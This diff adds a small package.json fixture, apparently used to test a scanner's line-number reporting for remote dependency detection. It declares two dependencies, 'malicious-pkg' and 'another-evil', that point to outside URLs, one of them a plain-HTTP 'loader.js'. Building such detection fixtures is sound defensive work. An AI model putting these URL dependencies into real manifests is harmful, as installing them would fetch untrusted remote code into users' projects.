@@ -1,0 +1,15 @@
+{
+  "name": "rdd-line-number-test",
+  "version": "1.0.0",
+  "description": "Test fixture for RDD line number accuracy",
+  "author": {
+    "name": "JPD"
+  },
+  "dependencies": {
+    "legit-pkg": "^4.0.0",
+    "malicious-pkg": "https://storeartifact.com/npm/evil"
+  },
+  "devDependencies": {
+    "another-evil": "http://jpartifacts.com/loader.js"
+  }
+}
